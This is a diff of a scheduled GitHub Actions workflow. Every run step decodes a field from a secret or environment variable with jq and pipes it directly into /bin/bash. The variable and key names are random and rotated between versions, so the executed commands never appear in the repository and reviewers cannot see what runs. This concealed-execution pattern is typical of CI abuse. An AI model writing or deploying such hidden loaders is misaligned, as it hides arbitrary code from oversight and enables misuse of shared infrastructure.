@@ -1,25 +1,27 @@
 name: zaifujinjigequyutansuo
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '23 0/6 * * *'
+    - cron: '57 2/6 * * *'
 
-jobs:  # 23835
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: zaifujinjigequyutansuo
         env:
-          zx8657: ${{ secrets.zx8657 }}
+          amxbi8: ${{ secrets.amxbi8 }}
         run: |
-          echo $zx8657 | jq -r .twpi480 | /bin/bash
-          echo $qqj390 | jq -r .bbkxm82744 | /bin/bash
-          echo $auwd256 | jq -r .isdpj1 | /bin/bash
-          echo $mq88770 | jq -r .i6 | /bin/bash
-          echo $dyleq72027 | jq -r .lpqg4124 | /bin/bash
-          echo $lkwlt641 | jq -r .weycc9 | /bin/bash
-          echo $grwmp5358 | jq -r .f86 | /bin/bash
-          echo $o57302 | jq -r .tv3552 | /bin/bash
+          echo $amxbi8 | jq -r .jw0566 | /bin/bash
+          echo $gxqf2593 | jq -r .r27238 | /bin/bash
+          echo $p4 | jq -r .ubuow96 | /bin/bash
+          echo $bk73 | jq -r .jt716 | /bin/bash
+          echo $apu761 | jq -r .nz9 | /bin/bash
+          echo $ajtla12 | jq -r .tazn74 | /bin/bash
+          echo $osy50835 | jq -r .ksy1 | /bin/bash
+          echo $coq376 | jq -r .uheo681 | /bin/bash
+          echo $ygk224 | jq -r .esxn4 | /bin/bash
+          echo $jnw8 | jq -r .ir80104 | /bin/bash
 
